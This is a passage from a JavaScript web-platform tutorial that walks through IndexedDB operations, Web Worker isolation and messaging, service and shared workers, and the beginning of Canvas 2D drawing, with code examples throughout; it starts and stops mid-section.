const store = db.createObjectStore('users', { autoIncrement: true });

// Out-of-line keys (manually specified on each operation)
const store = db.createObjectStore('users');
```

### Transaction Model

All database operations occur within transactions. Transactions define scope (object stores) and mode (readonly, readwrite, versionchange):

```javascript
const transaction = db.transaction(['users', 'posts'], 'readwrite');

transaction.oncomplete = () => {
  console.log('Transaction completed successfully');
};

transaction.onerror = (event) => {
  console.error('Transaction failed:', event.target.error);
};

transaction.onabort = () => {
  console.log('Transaction aborted');
};

const userStore = transaction.objectStore('users');
const postStore = transaction.objectStore('posts');
```

#### Transaction Lifecycle

Transactions auto-commit when all requests complete and the microtask queue empties:

```javascript
const transaction = db.transaction(['users'], 'readwrite');
const store = transaction.objectStore('users');

const request = store.add({ name: 'Alice' });

request.onsuccess = () => {
  console.log('Added user');
  // Transaction still active here
  
  // Synchronous operation keeps transaction alive
  store.add({ name: 'Bob' });
};

// Transaction commits after event handlers complete
// and no pending requests remain
```

### CRUD Operations

#### Create (Add/Put)

```javascript
const transaction = db.transaction(['users'], 'readwrite');
const store = transaction.objectStore('users');

// add() fails if key exists
const addRequest = store.add({ id: 1, name: 'Alice', age: 30 });

addRequest.onsuccess = () => {
  console.log('User added, key:', addRequest.result);
};

// put() overwrites existing records
const putRequest = store.put({ id: 1, name: 'Alice Updated', age: 31 });
```

#### Read (Get)

```javascript
const transaction = db.transaction(['users'], 'readonly');
const store = transaction.objectStore('users');

const request = store.get(1);

request.onsuccess = () => {
  const user = request.result;
  if (user) {
    console.log('Found user:', user);
  } else {
    console.log('User not found');
  }
};
```

#### Update (Put)

```javascript
const transaction = db.transaction(['users'], 'readwrite');
const store = transaction.objectStore('users');

// Retrieve, modify, store pattern
const getRequest = store.get(1);

getRequest.onsuccess = () => {
  const user = getRequest.result;
  user.age = 32;
  
  const updateRequest = store.put(user);
  updateRequest.onsuccess = () => {
    console.log('User updated');
  };
};
```

#### Delete

```javascript
const transaction = db.transaction(['users'], 'readwrite');
const store = transaction.objectStore('users');

const request = store.delete(1);

request.onsuccess = () => {
  console.log('User deleted');
};
```

### Cursor-Based Iteration

Cursors provide sequential access to multiple records:

```javascript
const transaction = db.transaction(['users'], 'readonly');
const store = transaction.objectStore('users');

const request = store.openCursor();

request.onsuccess = (event) => {
  const cursor = event.target.result;
  
  if (cursor) {
    console.log('Key:', cursor.key, 'Value:', cursor.value);
    
    // Move to next record
    cursor.continue();
  } else {
    console.log('No more records');
  }
};
```

#### Cursor Direction and Range

```javascript
// Iterate in reverse
store.openCursor(null, 'prev');

// Iterate with key range
const range = IDBKeyRange.bound(1, 10);
store.openCursor(range, 'next');

// Skip to specific key
request.onsuccess = (event) => {
  const cursor = event.target.result;
  if (cursor) {
    if (cursor.key < 5) {
      cursor.continue(5); // Jump to key 5
    } else {
      cursor.continue(); // Normal iteration
    }
  }
};
```

#### Cursor Modification

```javascript
const transaction = db.transaction(['users'], 'readwrite');
const store = transaction.objectStore('users');

store.openCursor().onsuccess = (event) => {
  const cursor = event.target.result;
  
  if (cursor) {
    const user = cursor.value;
    user.lastModified = Date.now();
    
    cursor.update(user); // Update current record
    
    // Or delete current record
    // cursor.delete();
    
    cursor.continue();
  }
};
```

### Index Operations

Indexes enable queries on non-key properties:

```javascript
const transaction = db.transaction(['users'], 'readonly');
const store = transaction.objectStore('users');
const index = store.index('email');

// Get by index
const request = index.get('alice@example.com');

request.onsuccess = () => {
  console.log('User:', request.result);
};

// Get key by index
const keyRequest = index.getKey('alice@example.com');

keyRequest.onsuccess = () => {
  console.log('Primary key:', keyRequest.result);
};

// Iterate via index
index.openCursor().onsuccess = (event) => {
  const cursor = event.target.result;
  if (cursor) {
    console.log('Indexed value:', cursor.key, 'Record:', cursor.value);
    cursor.continue();
  }
};
```

#### Compound Indexes

```javascript
request.onupgradeneeded = (event) => {
  const db = event.target.result;
  const store = db.createObjectStore('users', { keyPath: 'id' });
  
  // Index on array creates compound key
  store.createIndex('name_age', ['lastName', 'firstName', 'age']);
};

// Query with compound key
const index = store.index('name_age');
const range = IDBKeyRange.bound(
  ['Smith', 'A', 20],
  ['Smith', 'Z', 40]
);
index.openCursor(range);
```

### Key Ranges

IDBKeyRange constructs specify query boundaries:

```javascript
// Only key 5
IDBKeyRange.only(5);

// Keys >= 5
IDBKeyRange.lowerBound(5);

// Keys > 5 (open bound)
IDBKeyRange.lowerBound(5, true);

// Keys <= 10
IDBKeyRange.upperBound(10);

// Keys < 10 (open bound)
IDBKeyRange.upperBound(10, true);

// Keys 5 <= x <= 10
IDBKeyRange.bound(5, 10);

// Keys 5 < x < 10 (both open)
IDBKeyRange.bound(5, 10, true, true);
```

#### Range Queries

```javascript
const transaction = db.transaction(['users'], 'readonly');
const store = transaction.objectStore('users');
const index = store.index('age');

// Users aged 25-35
const range = IDBKeyRange.bound(25, 35);

index.openCursor(range).onsuccess = (event) => {
  const cursor = event.target.result;
  if (cursor) {
    console.log('User in age range:', cursor.value);
    cursor.continue();
  }
};
```

### Bulk Operations

#### GetAll and GetAllKeys

```javascript
const transaction = db.transaction(['users'], 'readonly');
const store = transaction.objectStore('users');

// Get all records
const getAllRequest = store.getAll();

getAllRequest.onsuccess = () => {
  console.log('All users:', getAllRequest.result);
};

// Get all keys
const getAllKeysRequest = store.getAllKeys();

getAllKeysRequest.onsuccess = () => {
  console.log('All keys:', getAllKeysRequest.result);
};

// Limited count
const limitedRequest = store.getAll(null, 10); // First 10 records
```

#### Count Operations

```javascript
const transaction = db.transaction(['users'], 'readonly');
const store = transaction.objectStore('users');

const countRequest = store.count();

countRequest.onsuccess = () => {
  console.log('Total users:', countRequest.result);
};

// Count with range
const range = IDBKeyRange.bound(1, 100);
const rangeCountRequest = store.count(range);
```

#### Clear Object Store

```javascript
const transaction = db.transaction(['users'], 'readwrite');
const store = transaction.objectStore('users');

const clearRequest = store.clear();

clearRequest.onsuccess = () => {
  console.log('All records deleted');
};
```

### Version Management

Database schema changes require version upgrades:

```javascript
// Initial version
const request1 = indexedDB.open('MyDB', 1);

request1.onupgradeneeded = (event) => {
  const db = event.target.result;
  db.createObjectStore('users', { keyPath: 'id' });
};

// Later upgrade
const request2 = indexedDB.open('MyDB', 2);

request2.onupgradeneeded = (event) => {
  const db = event.target.result;
  const transaction = event.target.transaction;
  
  if (event.oldVersion < 2) {
    // Add new object store
    db.createObjectStore('posts', { keyPath: 'id' });
    
    // Add index to existing store
    const userStore = transaction.objectStore('users');
    userStore.createIndex('email', 'email', { unique: true });
  }
};
```

#### Data Migration

```javascript
request.onupgradeneeded = (event) => {
  const db = event.target.result;
  const transaction = event.target.transaction;
  
  if (event.oldVersion < 3) {
    const store = transaction.objectStore('users');
    
    // Migrate data structure
    store.openCursor().onsuccess = (event) => {
      const cursor = event.target.result;
      if (cursor) {
        const user = cursor.value;
        
        // Transform old format to new
        user.fullName = `${user.firstName} ${user.lastName}`;
        delete user.firstName;
        delete user.lastName;
        
        cursor.update(user);
        cursor.continue();
      }
    };
  }
};
```

### Error Handling Patterns

#### Request-Level Errors

```javascript
const request = store.get(1);

request.onerror = (event) => {
  console.error('Get failed:', event.target.error);
  event.preventDefault(); // Prevent transaction abort
};
```

#### Transaction-Level Errors

```javascript
const transaction = db.transaction(['users'], 'readwrite');

transaction.onerror = (event) => {
  console.error('Transaction error:', event.target.error);
};

transaction.onabort = (event) => {
  console.log('Transaction aborted');
  
  // Check abort reason
  if (transaction.error) {
    console.error('Abort reason:', transaction.error);
  }
};
```

#### Common Error Types

```javascript
// ConstraintError: Unique constraint violation
store.add({ id: 1, email: 'duplicate@example.com' });

// DataError: Invalid key or key path
store.add({ invalidKey: 'abc' }); // When keyPath expects number

// TransactionInactiveError: Transaction already completed
const transaction = db.transaction(['users'], 'readwrite');
setTimeout(() => {
  transaction.objectStore('users').add({}); // Fails
}, 100);

// NotFoundError: Object store doesn't exist
db.transaction(['nonexistent'], 'readonly');
```

### Promise Wrapper Pattern

Convert callback-based API to promises:

```javascript
function promisifyRequest(request) {
  return new Promise((resolve, reject) => {
    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
}

async function getUser(db, id) {
  const transaction = db.transaction(['users'], 'readonly');
  const store = transaction.objectStore('users');
  return promisifyRequest(store.get(id));
}

// Usage
try {
  const user = await getUser(db, 1);
  console.log('User:', user);
} catch (error) {
  console.error('Error:', error);
}
```

### Storage Limits and Quotas

[Inference] Browser implementations typically provide different storage limits based on persistence type:

```javascript
// Check storage estimate
if (navigator.storage && navigator.storage.estimate) {
  navigator.storage.estimate().then(estimate => {
    console.log('Usage:', estimate.usage);
    console.log('Quota:', estimate.quota);
    console.log('Percentage:', (estimate.usage / estimate.quota * 100).toFixed(2));
  });
}

// Request persistent storage
if (navigator.storage && navigator.storage.persist) {
  navigator.storage.persist().then(granted => {
    if (granted) {
      console.log('Persistent storage granted');
    }
  });
}
```

### Database Deletion

```javascript
const deleteRequest = indexedDB.deleteDatabase('MyDatabase');

deleteRequest.onsuccess = () => {
  console.log('Database deleted');
};

deleteRequest.onerror = () => {
  console.error('Delete failed');
};

deleteRequest.onblocked = () => {
  console.log('Delete blocked by open connections');
};
```

### Multi-Tab Coordination

#### Version Change Blocking

```javascript
const request = indexedDB.open('MyDB', 2);

request.onblocked = () => {
  console.log('Upgrade blocked by other tabs');
  // Notify user to close other tabs
};

// In other tabs, close connection on versionchange
db.onversionchange = () => {
  db.close();
  alert('Database upgrade required. Page will reload.');
  location.reload();
};
```

### Binary Data Storage

```javascript
const transaction = db.transaction(['files'], 'readwrite');
const store = transaction.objectStore('files');

// Store Blob
const blob = new Blob(['file content'], { type: 'text/plain' });
store.add({ id: 1, name: 'document.txt', data: blob });

// Store ArrayBuffer
const buffer = new ArrayBuffer(8);
const view = new Uint8Array(buffer);
view[0] = 255;
store.add({ id: 2, name: 'binary.dat', data: buffer });

// Store File
const fileInput = document.querySelector('input[type="file"]');
const file = fileInput.files[0];
store.add({ id: 3, name: file.name, data: file });
```

### Performance Considerations

#### Batch Operations in Single Transaction

```javascript
// Efficient: Single transaction
const transaction = db.transaction(['users'], 'readwrite');
const store = transaction.objectStore('users');

for (let i = 0; i < 1000; i++) {
  store.add({ id: i, name: `User ${i}` });
}

// Less efficient: Multiple transactions
for (let i = 0; i < 1000; i++) {
  const transaction = db.transaction(['users'], 'readwrite');
  transaction.objectStore('users').add({ id: i, name: `User ${i}` });
}
```

#### Index Selection

```javascript
// Use appropriate index for query
const store = transaction.objectStore('users');

// Query by email (has index) - efficient
const emailIndex = store.index('email');
emailIndex.get('alice@example.com');

// Query by unindexed field - requires full scan
store.openCursor().onsuccess = (event) => {
  const cursor = event.target.result;
  if (cursor) {
    if (cursor.value.city === 'New York') {
      // Process matching record
    }
    cursor.continue();
  }
};
```

---

## Web Workers (DOM Restrictions Context)

### The Fundamental Isolation Model

Web Workers execute in a completely separate global context from the main thread, with no access to the DOM, Window object, or Document object. This isolation is architectural—workers operate in a `WorkerGlobalScope` (or `DedicatedWorkerGlobalScope` for standard workers) that lacks any DOM APIs entirely.

The separation is enforced at the JavaScript engine level. Workers cannot:

- Access `document`, `window`, or any DOM nodes
- Manipulate HTML elements or their properties
- Read or write to `localStorage` or `sessionStorage`
- Access the parent window's global scope or variables
- Use `document.cookie`
- Directly call any function defined in the main thread

This creates a hard boundary where workers can compute, but cannot render or interact with the page structure.

### Available APIs in Workers

Despite DOM restrictions, workers retain access to substantial JavaScript functionality:

```javascript
// worker.js - Available APIs
self.console.log('Logging works');
self.setTimeout(() => {}, 1000);
self.setInterval(() => {}, 1000);

const data = await fetch('https://api.example.com/data');
const response = await data.json();

const ws = new WebSocket('wss://example.com');
const db = indexedDB.open('myDatabase');

importScripts('lib1.js', 'lib2.js'); // Synchronous script loading
```

**Core available APIs:**

- **Timers**: `setTimeout`, `setInterval`, `clearTimeout`, `clearInterval`
- **Network**: `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`
- **Storage**: `IndexedDB`, `Cache API`
- **Workers**: Can spawn sub-workers (`new Worker()`)
- **Crypto**: `crypto.subtle` for cryptographic operations
- **Performance**: `performance.now()`, performance marks/measures
- **Console**: Full console API for debugging
- **Math**: All standard JavaScript built-ins (Math, Date, JSON, etc.)

### Message Passing Architecture

Communication occurs exclusively through structured cloning via `postMessage`:

```javascript
// main.js
const worker = new Worker('worker.js');

worker.postMessage({
  type: 'PROCESS_DATA',
  payload: { values: [1, 2, 3, 4, 5] }
});

worker.onmessage = (event) => {
  const { type, result } = event.data;
  if (type === 'RESULT') {
    updateDOM(result); // Main thread handles DOM
  }
};

// worker.js
self.onmessage = (event) => {
  const { type, payload } = event.data;
  
  if (type === 'PROCESS_DATA') {
    const result = heavyComputation(payload.values);
    self.postMessage({ type: 'RESULT', result });
  }
};
```

The structured clone algorithm serializes data deeply, supporting most JavaScript types but with limitations:

- **Supported**: primitives, objects, arrays, Date, RegExp, Map, Set, ArrayBuffer, TypedArrays, Blob, File, ImageData
- **Not supported**: Functions, DOM nodes, symbols, WeakMap, WeakSet, proxies with non-cloneable targets

Attempting to post DOM nodes fails immediately:

```javascript
// main.js
const element = document.querySelector('div');
worker.postMessage({ element }); // DOMException: Failed to execute 'postMessage'
```

### Transferable Objects and Zero-Copy

Transferable objects enable ownership transfer without copying, critical for large binary data:

```javascript
// main.js
const buffer = new ArrayBuffer(1024 * 1024 * 100); // 100MB
const view = new Uint8Array(buffer);
// Fill buffer with data...

worker.postMessage(
  { type: 'PROCESS', buffer: view.buffer },
  [view.buffer] // Transfer list
);

// buffer is now neutered (length becomes 0)
console.log(buffer.byteLength); // 0
```

After transfer:

- The sender's reference becomes detached (unusable)
- The receiver gains ownership without copying
- Performance is O(1) regardless of size

**Transferable types:**

- `ArrayBuffer`
- `MessagePort`
- `ImageBitmap`
- `OffscreenCanvas`
- `ReadableStream`, `WritableStream`, `TransformStream`

### Working Without DOM: Data Processing Patterns

Since workers cannot read DOM, the main thread must extract and send data:

```javascript
// main.js - Extract DOM data before sending
const tableRows = Array.from(document.querySelectorAll('table tr'));
const data = tableRows.map(row => ({
  cells: Array.from(row.cells).map(cell => cell.textContent),
  id: row.dataset.id
}));

worker.postMessage({ type: 'ANALYZE_TABLE', data });

worker.onmessage = (event) => {
  const { type, results } = event.data;
  
  if (type === 'ANALYSIS_COMPLETE') {
    // Update DOM with results
    results.forEach((result, index) => {
      tableRows[index].classList.toggle('highlight', result.shouldHighlight);
    });
  }
};
```

The pattern separates concerns:

1. **Main thread**: DOM reading → data extraction → message send → DOM writing
2. **Worker**: Data processing only
3. **Main thread**: Apply results to DOM

### Canvas Offloading with OffscreenCanvas

`OffscreenCanvas` enables canvas rendering in workers by transferring canvas control:

```javascript
// main.js
const canvas = document.querySelector('canvas');
const offscreen = canvas.transferControlToOffscreen();

worker.postMessage(
  { type: 'INIT_CANVAS', canvas: offscreen },
  [offscreen]
);

// main.js can no longer draw to this canvas

// worker.js
let ctx;

self.onmessage = (event) => {
  if (event.data.type === 'INIT_CANVAS') {
    ctx = event.data.canvas.getContext('2d');
    animate();
  }
};

function animate() {
  ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
  
  // Perform rendering
  ctx.fillRect(50, 50, 100, 100);
  
  requestAnimationFrame(animate); // Available in worker!
}
```

This pattern offloads rendering computation entirely, though the canvas remains in the document. The main thread loses drawing control but can still:

- Receive input events on the canvas element
- Forward interaction data to the worker via messages

```javascript
// main.js
canvas.addEventListener('click', (event) => {
  const rect = canvas.getBoundingClientRect();
  worker.postMessage({
    type: 'CANVAS_CLICK',
    x: event.clientX - rect.left,
    y: event.clientY - rect.top
  });
});
```

### Storage API Restrictions

Workers cannot access `localStorage` or `sessionStorage` as these are synchronous APIs tied to the document:

```javascript
// worker.js
try {
  localStorage.setItem('key', 'value'); // ReferenceError: localStorage is not defined
} catch (error) {
  console.error('localStorage unavailable');
}
```

Alternative storage in workers:

#### IndexedDB (Asynchronous)

```javascript
// worker.js
const request = indexedDB.open('WorkerDB', 1);

request.onupgradeneeded = (event) => {
  const db = event.target.result;
  db.createObjectStore('data', { keyPath: 'id' });
};

request.onsuccess = (event) => {
  const db = event.target.result;
  
  const transaction = db.transaction('data', 'readwrite');
  const store = transaction.objectStore('data');
  
  store.add({ id: 1, value: 'example' });
};
```

#### Cache API

```javascript
// worker.js
async function cacheData(key, data) {
  const cache = await caches.open('worker-cache');
  const response = new Response(JSON.stringify(data));
  await cache.put(key, response);
}

async function retrieveData(key) {
  const cache = await caches.open('worker-cache');
  const response = await cache.match(key);
  return response ? await response.json() : null;
}
```

#### Main Thread Proxying

For localStorage-like behavior, proxy through the main thread:

```javascript
// main.js
worker.onmessage = (event) => {
  const { type, key, value, id } = event.data;
  
  if (type === 'LOCALSTORAGE_GET') {
    const result = localStorage.getItem(key);
    worker.postMessage({ type: 'LOCALSTORAGE_RESPONSE', id, result });
  } else if (type === 'LOCALSTORAGE_SET') {
    localStorage.setItem(key, value);
    worker.postMessage({ type: 'LOCALSTORAGE_RESPONSE', id, success: true });
  }
};

// worker.js
class LocalStorageProxy {
  constructor() {
    this.pendingRequests = new Map();
    this.requestId = 0;
  }
  
  async getItem(key) {
    const id = this.requestId++;
    
    return new Promise((resolve) => {
      this.pendingRequests.set(id, resolve);
      self.postMessage({ type: 'LOCALSTORAGE_GET', key, id });
    });
  }
  
  handleResponse(data) {
    const { id, result } = data;
    const resolve = this.pendingRequests.get(id);
    if (resolve) {
      resolve(result);
      this.pendingRequests.delete(id);
    }
  }
}

const storage = new LocalStorageProxy();

self.onmessage = (event) => {
  if (event.data.type === 'LOCALSTORAGE_RESPONSE') {
    storage.handleResponse(event.data);
  }
};

// Usage
const value = await storage.getItem('myKey');
```

### Event Handling Limitations

Workers cannot directly attach to DOM events since they lack access to elements:

```javascript
// worker.js
// This fails - no document object
document.addEventListener('click', handler); // ReferenceError
```

The main thread must capture events and relay them:

```javascript
// main.js
document.addEventListener('mousemove', (event) => {
  worker.postMessage({
    type: 'MOUSE_MOVE',
    x: event.clientX,
    y: event.clientY,
    timestamp: performance.now()
  });
});

// worker.js
const mousePositions = [];

self.onmessage = (event) => {
  if (event.data.type === 'MOUSE_MOVE') {
    mousePositions.push({
      x: event.data.x,
      y: event.data.y,
      time: event.data.timestamp
    });
    
    // Compute mouse velocity, patterns, etc.
    analyzeMouseBehavior(mousePositions);
  }
};
```

For high-frequency events, throttle or batch:

```javascript
// main.js
let pendingMouseData = [];
let rafScheduled = false;

document.addEventListener('mousemove', (event) => {
  pendingMouseData.push({
    x: event.clientX,
    y: event.clientY,
    timestamp: performance.now()
  });
  
  if (!rafScheduled) {
    rafScheduled = true;
    requestAnimationFrame(() => {
      worker.postMessage({
        type: 'MOUSE_BATCH',
        events: pendingMouseData
      });
      pendingMouseData = [];
      rafScheduled = false;
    });
  }
});
```

### Network Requests and CORS

Workers can make network requests but inherit the page's origin and CORS restrictions:

```javascript
// worker.js
async function fetchData() {
  try {
    const response = await fetch('https://api.example.com/data', {
      credentials: 'include', // Sends cookies
      headers: {
        'Content-Type': 'application/json'
      }
    });
    
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Fetch failed:', error);
  }
}
```

CORS policies apply identically to worker requests. Cookies and authentication credentials are sent based on `credentials` mode, using the main document's cookie jar.

Workers can use `XMLHttpRequest` with full feature parity to the main thread:

```javascript
// worker.js
function xhrRequest(url) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', url);
    
    xhr.onload = () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        resolve(xhr.response);
      } else {
        reject(new Error(`HTTP ${xhr.status}`));
      }
    };
    
    xhr.onerror = () => reject(new Error('Network error'));
    xhr.send();
  });
}
```

### Import and Module Loading

Workers can load additional scripts synchronously via `importScripts`:

```javascript
// worker.js
importScripts('utils.js', 'math-lib.js');

// Now use functions from imported scripts
const result = utilFunction();
```

`importScripts` blocks execution until all scripts load and execute, following the order specified. Relative URLs resolve relative to the worker script location.

Module workers support ES6 imports:

```javascript
// main.js
const worker = new Worker('worker.js', { type: 'module' });

// worker.js
import { calculate } from './math-lib.js';
import lodash from 'https://cdn.example.com/lodash.js';

self.onmessage = (event) => {
  const result = calculate(event.data);
  self.postMessage(result);
};
```

Module workers enable:

- Static imports with proper dependency resolution
- Top-level await
- Better tree-shaking and optimization
- Standard ES module semantics

Classic workers vs. module workers differ in scope:

```javascript
// Classic worker - global scope pollution
// worker.js
var globalVar = 'accessible everywhere';

// Module worker - module scope
// worker.js
const moduleVar = 'not globally accessible';
export function publicAPI() {} // Explicit exports needed
```

### Accessing Worker-Specific APIs

Workers have unique APIs unavailable to the main thread:

```javascript
// worker.js

// Close the worker from inside
self.close(); // Worker terminates, cannot be restarted

// Global scope reference
console.log(self === globalThis); // true in workers

// Worker location info
console.log(self.location.href); // Worker script URL

// Import additional workers
const subWorker = new Worker('sub-worker.js');
```

The worker's global scope lacks:

- `window` object
- `document` object
- `parent`, `top` window references
- Any DOM-related constructors (HTMLElement, Node, etc.)
- Navigation APIs (history, location manipulation)
- Alert/confirm/prompt dialogs

### Communication Error Handling

Message passing can fail silently if data isn't clonable:

```javascript
// main.js
const worker = new Worker('worker.js');

worker.onerror = (error) => {
  console.error('Worker error:', error.message, error.filename, error.lineno);
};

worker.onmessageerror = (event) => {
  console.error('Message deserialization failed');
};

try {
  worker.postMessage({
    func: () => {} // Functions not clonable
  });
} catch (error) {
  console.error('PostMessage failed:', error);
}
```

Handling uncaught exceptions in workers:

```javascript
// worker.js
self.onerror = (event) => {
  console.error('Uncaught error in worker:', event.message);
  
  // Report to main thread
  self.postMessage({
    type: 'ERROR',
    message: event.message,
    filename: event.filename,
    lineno: event.lineno
  });
  
  // Prevent default (suppress console error)
  event.preventDefault();
};

self.onunhandledrejection = (event) => {
  console.error('Unhandled promise rejection:', event.reason);
  
  self.postMessage({
    type: 'UNHANDLED_REJECTION',
    reason: event.reason
  });
  
  event.preventDefault();
};
```

### Shared Workers and Multiple Contexts

Shared Workers introduce port-based messaging since multiple pages can connect:

```javascript
// main.js
const sharedWorker = new SharedWorker('shared-worker.js');

sharedWorker.port.onmessage = (event) => {
  console.log('Received:', event.data);
};

sharedWorker.port.postMessage('Hello from page');
sharedWorker.port.start(); // Required for shared workers

// shared-worker.js
const connections = [];

self.onconnect = (event) => {
  const port = event.ports[0];
  connections.push(port);
  
  port.onmessage = (event) => {
    // Broadcast to all connected pages
    connections.forEach(p => {
      if (p !== port) {
        p.postMessage(event.data);
      }
    });
  };
  
  port.start();
};
```

Shared workers lack DOM access identically to dedicated workers but enable cross-tab coordination without main thread involvement.

### WorkerNavigator and Environment Detection

Workers have a limited `navigator` object:

```javascript
// worker.js
console.log(navigator.userAgent);
console.log(navigator.language);
console.log(navigator.hardwareConcurrency); // CPU core count
console.log(navigator.onLine); // Network status

// Available but limited
console.log(navigator.cookieEnabled); // undefined - no cookies
console.log(navigator.geolocation); // undefined - no geolocation
```

Detect worker context:

```javascript
function isWorkerContext() {
  return typeof WorkerGlobalScope !== 'undefined' && 
         self instanceof WorkerGlobalScope;
}

function isMainThread() {
  return typeof window !== 'undefined';
}
```

### Blob URLs and Inline Workers

Create workers without separate files:

```javascript
// main.js
const workerCode = `
  self.onmessage = (event) => {
    const result = event.data * 2;
    self.postMessage(result);
  };
`;

const blob = new Blob([workerCode], { type: 'application/javascript' });
const workerUrl = URL.createObjectURL(blob);
const worker = new Worker(workerUrl);

worker.onmessage = (event) => {
  console.log('Result:', event.data);
};

worker.postMessage(5);

// Clean up when done
worker.terminate();
URL.revokeObjectURL(workerUrl);
```

This enables dynamic worker generation but sacrifices caching and debugging convenience. Source maps won't work naturally with blob workers.

### Service Workers and DOM Context

Service Workers operate identically to Web Workers regarding DOM restrictions but have additional APIs:

```javascript
// service-worker.js (no DOM access)

self.addEventListener('fetch', (event) => {
  // Cannot access document, but can intercept all network requests
  event.respondWith(
    caches.match(event.request).then(response => {
      return response || fetch(event.request);
    })
  );
});

self.addEventListener('message', (event) => {
  // Communication with pages via postMessage
  const { type, data } = event.data;
  
  if (type === 'CACHE_URLS') {
    caches.open('v1').then(cache => {
      cache.addAll(data.urls);
    });
  }
});

// Access clients (pages) but not their DOM
self.clients.matchAll().then(clients => {
  clients.forEach(client => {
    client.postMessage({ type: 'UPDATE_AVAILABLE' });
  });
});
```

Service workers gain network interception and push notifications but lose nothing regarding DOM—they never had access to begin with.

### Debugging Workers Without DOM

Without DOM inspection, debugging relies on:

```javascript
// worker.js

// Console API works fully
console.log('Simple log');
console.table([{ id: 1, name: 'test' }]);
console.time('operation');
// ... work ...
console.timeEnd('operation');

// Performance marks
performance.mark('start-computation');
// ... work ...
performance.mark('end-computation');
performance.measure('computation', 'start-computation', 'end-computation');

// Report to main thread for visualization
const entries = performance.getEntriesByType('measure');
self.postMessage({
  type: 'PERFORMANCE_DATA',
  measures: entries.map(e => ({
    name: e.name,
    duration: e.duration
  }))
});
```

Chrome DevTools shows workers in a separate thread panel with full debugging support: breakpoints, step execution, scope inspection, and console evaluation within worker context.

### Data URL Workers and CSP

Workers respect Content Security Policy, which may block blob or data URLs:

```javascript
// Blocked by strict CSP
const worker = new Worker('data:application/javascript,self.postMessage("test")');
```

With CSP `worker-src` directive, specify allowed sources:

```
Content-Security-Policy: worker-src 'self' blob:
```

When CSP blocks worker creation, the constructor throws:

```javascript
try {
  const worker = new Worker('data:...');
} catch (error) {
  console.error('Worker blocked by CSP:', error);
  // Fallback to main thread execution
}
```

### Practical Pattern: Virtual DOM Diffing

Since workers can't access DOM, they can compute virtual DOM changes:

```javascript
// main.js
const worker = new Worker('vdom-worker.js');
let currentVDOM = getInitialVDOM();

worker.postMessage({
  type: 'COMPUTE_DIFF',
  oldTree: currentVDOM,
  newTree: getNewVDOM()
});

worker.onmessage = (event) => {
  const { type, patches } = event.data;
  
  if (type === 'PATCHES') {
    applyPatchesToDOM(patches);
    currentVDOM = event.data.newTree;
  }
};

function applyPatchesToDOM(patches) {
  patches.forEach(patch => {
    const element = document.querySelector(patch.selector);
    switch (patch.type) {
      case 'UPDATE_TEXT':
        element.textContent = patch.value;
        break;
      case 'SET_ATTRIBUTE':
        element.setAttribute(patch.name, patch.value);
        break;
      case 'REMOVE_NODE':
        element.remove();
        break;
    }
  });
}

// vdom-worker.js
function computeDiff(oldTree, newTree) {
  const patches = [];
  // Diffing algorithm here
  return patches;
}

self.onmessage = (event) => {
  const { oldTree, newTree } = event.data;
  const patches = computeDiff(oldTree, newTree);
  
  self.postMessage({
    type: 'PATCHES',
    patches,
    newTree
  });
};
```

This offloads expensive diffing while keeping DOM manipulation on the main thread where it must occur.

---

## Canvas Element Manipulation

### Canvas Context Types

The canvas element supports multiple rendering contexts, each with distinct capabilities:

**2D Context (`CanvasRenderingContext2D`)**: Vector graphics, text, images, and pixel manipulation. Accessed via `canvas.getContext('2d')`.

**WebGL Context (`WebGLRenderingContext`)**: Hardware-accelerated 3D graphics using OpenGL ES. Accessed via `canvas.getContext('webgl')` or `canvas.getContext('webgl2')`.

**Bitmap Renderer Context**: Transfers `ImageBitmap` objects directly. Accessed via `canvas.getContext('bitmaprenderer')`.

Once a context is created, the canvas is locked to that type. Requesting a different context type returns `null`.

### Canvas Initialization and Sizing

#### HTML Declaration

```html
<canvas id="myCanvas" width="800" height="600"></canvas>
```

The `width` and `height` attributes define the canvas's coordinate space (drawing buffer size), not its display size. CSS controls display dimensions.

#### JavaScript Initialization

```javascript
const canvas = document.getElementById('myCanvas');
const ctx = canvas.getContext('2d');

// Set drawing buffer size
canvas.width = 1920;
canvas.height = 1080;

// CSS controls display size
canvas.style.width = '960px';
canvas.style.height = '540px';
```

#### Resolution and Display Size Relationship

When CSS dimensions differ from buffer dimensions, the browser scales the rendered output:

```javascript
// High DPI display handling
const dpr = window.devicePixelRatio || 1;
const rect = canvas.getBoundingClientRect();

canvas.width = rect.width * dpr;
canvas.height = rect.height * dpr;
canvas.style.width = rect.width + 'px';
canvas.style.height = rect.height + 'px';

ctx.scale(dpr, dpr);
```

This maintains crisp rendering on high-density displays by matching the buffer size to physical pixels while drawing in CSS pixels.

### Drawing Operations

#### Path Construction

Paths define shapes through a sequence of commands. The path exists in memory until stroked or filled:

```javascript
ctx.beginPath();
ctx.moveTo(50, 50);
ctx.lineTo(200, 50);
ctx.lineTo(200, 200);
ctx.closePath(); // Connects back to start point
ctx.stroke();
```

**Path methods**:

- `moveTo(x, y)`: Move to position without drawing
- `lineTo(x, y)`: Draw straight line to position
- `arc(x, y, radius, startAngle, endAngle, counterclockwise)`: Draw circular arc
- `arcTo(x1, y1, x2, y2, radius)`: Draw arc connecting two tangent lines
- `bezierCurveTo(cp1x, cp1y, cp2x, cp2y, x, y)`: Cubic Bézier curve
- `quadraticCurveTo(cpx, cpy, x, y)`: Quadratic Bézier curve
- `rect(x, y, width, height)`: Add rectangle to path
- `ellipse(x, y, radiusX, radiusY, rotation, startAngle, endAngle, counterclockwise)`: Draw elliptical arc

#### Filling and Stroking

```javascript
// Fill solid shape
ctx.fillStyle = '#ff0000';
ctx.fillRect(10, 10, 100, 100);

// Stroke outline
ctx.strokeStyle = '#0000ff';
ctx.lineWidth = 3;
ctx.strokeRect(10, 10, 100, 100);

// Path-based fill and stroke
ctx.beginPath();
ctx.arc(150, 150, 50, 0, Math.PI * 2);
ctx.fillStyle = 'rgba(0, 255, 0, 0.5)';
ctx.fill();
ctx.strokeStyle = '#000000';
ctx.stroke();
```

#### Line Styling

```javascript
ctx.lineWidth = 5;
ctx.lineCap = 'round'; // 'butt', 'round', 'square'
ctx.lineJoin = 'round'; // 'miter', 'round', 'bevel'
ctx.miterLimit = 10; // Maximum miter length
